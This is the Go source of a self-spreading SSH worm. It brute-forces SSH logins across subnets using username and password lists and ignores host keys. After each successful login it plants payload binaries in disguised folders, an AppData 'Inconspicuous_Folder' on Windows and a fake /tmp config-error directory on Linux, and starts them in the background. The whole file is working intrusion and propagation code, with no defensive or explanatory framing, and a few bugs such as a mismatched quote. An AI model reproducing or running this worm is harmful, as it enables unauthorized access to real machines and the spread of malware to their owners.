package main

import (
		"golang.org/x/crypto/ssh"
		"fmt"
		"time"
		"strings"
		"os"
		"log"
		"bufio"
		"strconv"
		"runtime"
		"sync"

	"github.com/tmc/scp"
	//"net/http"
)
func main(){
	myos := runtime.GOOS
	startwormingboi(myos)
}

func startwormingboi(myos string) {

	var user = readinfile("user.txt")
	var passwds = readinfile("passwds.txt")
	var subnets = readinfile("subnets.txt")
	var step = readinfile("step.txt")
	start, err := strconv.ParseInt(step[0], 10, 64)
	if err != nil{
		log.Fatal(err)
	}
	stop, err := strconv.ParseInt(step[1], 10, 0)
	if err != nil{
		log.Fatal(err)
	}
	stepval, err := strconv.ParseInt(step[2], 10, 0)
	if err != nil{
		log.Fatal(err)
	}
	var myip = ""
	var wg sync.WaitGroup
	for i := 0; i < len(subnets); i++ {
		for l := start; l <= stop; l=l+stepval{
			myip = joinstrings(subnets[i],strconv.Itoa(int(l)))
				wg.Add(1)
				go gettingin(myip, user, passwds, myos, &wg)

			}
			wg.Wait()
		}
		wg.Wait()
	 } 

func gettingin(myip string, user []string, passwds []string, myos string, wg *sync.WaitGroup ){
	n := 0
	var iswin = false
	var passbreak = false
	for j := 0; j < len(user); j++ {
		for k := 0; k < len(passwds); k++ {
			if !(iswin) {
				n = len(getinlinux(myip, user[j], passwds[k]))
			}
			if n == 3 {
				fmt.Printf("\n ssh works for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
				passbreak = true
				break
			}
			if n == 1{
				iswin = true
			}
			if iswin{
				/**
				if  myos == "windows"{

					wincon := getinwin(myip, user[j],passwds[k])
					if wincon == 1 {
						fmt.Println("Im in windows with", myip, user[j], passwds[k])
						passbreak = true
						break
					} else if wincon == 2{
						fmt.Printf("\n didnt work windows with %s %s %s", myip ,user[j], passwds[k])
					} else {
						fmt.Println("target machine does not have psexec enabled")
					}
				} else{
					fmt.Println("cant get onto windows from nonwindows :(")
					passbreak = true
					break
				}*/
				passbreak = true;
			}
			if n == 2{
				fmt.Println("ssh doesn't work for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
			}
		}
		if passbreak {
			passbreak = false
			break
		}
	}
	defer wg.Done()
}

func getinlinux(myip string, user string, passwd string) (myreturn string) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd)},
	}
	var dest= joinstrings(myip, ":22")
	fmt.Println(dest)
	connection, err := ssh.Dial("tcp", dest, sshConfig)
	if err != nil {
		fmt.Println(err)
		if strings.Contains(err.Error(), "unable to authenticate") {
			return "no"
		} else {
			return "w"
		}
	}

	session := newsession(connection)
	if (execlinuxcmd(session, "who")!=nil) {
		execlinuxcmd(session, "mkdir \Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder'")
		scpexec(session, "linuxhappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\linuxhappyfuntimes")
		scpexec(session, "windowshappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
		execlinuxcmd(session, "START /B \\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
	} else {
		execlinuxcmd(session, "mkdir /tmp/config-err-XJM1ll78")
		scpexec(session, "linuxhappyfuntimes", "/tmp/config-err-XJM1ll78/linuxhappyfuntimes")
		scpexec(session, "windowshappyfuntimes", "/tmp/config-err-XJM1ll78/windowshappyfuntimes")
		execlinuxcmd(session, "./tmp/config-err-XJM1ll78/linuxhappyfuntimes > /dev/null 2>&1 &")
		// add exploit here
	}
	session.Close()
	return "yes"
}

func newsession(connection *ssh.Client)(session *ssh.Session){
	session, err := connection.NewSession()
	if err != nil {

	}
	return
}

func execlinuxcmd( session *ssh.Session, cmd string)(err error) {
	_ , err = session.CombinedOutput(cmd)
	if err != nil {
	}
	return
}

func scpexec( session *ssh.Session, srcfile string, destfile string)() {
	err := scp.CopyPath(srcfile, destfile, session)
	if err != nil {
	}
	return
}



func getinwin(myip string, user string, passwd string) (wincon int) {

	return
}

func joinstrings(string1, string2 string) (mashstring string){
	var strs []string
	strs = append(strs, string1)
	strs = append(strs, string2)
	mashstring = strings.Join(strs, "")
	return
}

func readinfile(myfile string) (readinarr []string){
	file, err := os.Open(myfile)
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        readinarr = append(readinarr, scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        log.Fatal(err)
    }
    return
}